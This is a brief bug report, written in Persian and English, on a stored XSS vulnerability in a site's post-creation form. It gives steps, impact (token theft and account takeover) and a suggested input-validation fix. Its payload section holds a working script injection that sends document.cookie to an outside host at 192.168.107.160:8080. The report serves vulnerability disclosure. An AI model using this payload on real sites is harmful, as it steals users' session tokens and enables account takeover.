# bug: stored XSS

## steps:
**در هنگام نوشتن پست جدید می تونی تگ رو break کنی و html injection داشته باشی**

## payload:
```html
salam"><script>
  fetch("http://192.168.107.160:8080/" + document.cookie)
    .catch(err => console.log("Request failed:", err));
</script>
```

## دلیل مخرب بودن:
**می تونی token هر کاربر رو بدزدی و ATO بزنی**

## fix:
**باید ورودی کاربر در هنگام پست گذاشتن ولیدیت بشه تا نتونه html inject کنه**


![alt text](image.png)